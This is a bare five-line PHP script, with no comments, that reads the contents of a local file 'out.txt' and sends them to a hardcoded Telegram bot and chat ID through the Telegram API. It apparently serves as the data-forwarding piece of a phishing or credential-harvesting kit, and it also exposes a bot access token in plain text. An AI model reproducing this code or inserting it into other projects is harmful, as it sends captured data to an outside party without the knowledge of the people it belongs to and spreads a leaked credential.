<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1966481856:AAHrXV8znIZfm04oe60ym5xcd4JJAwrrehA/sendMessage?chat_id=1836172154&text=$msg");
?>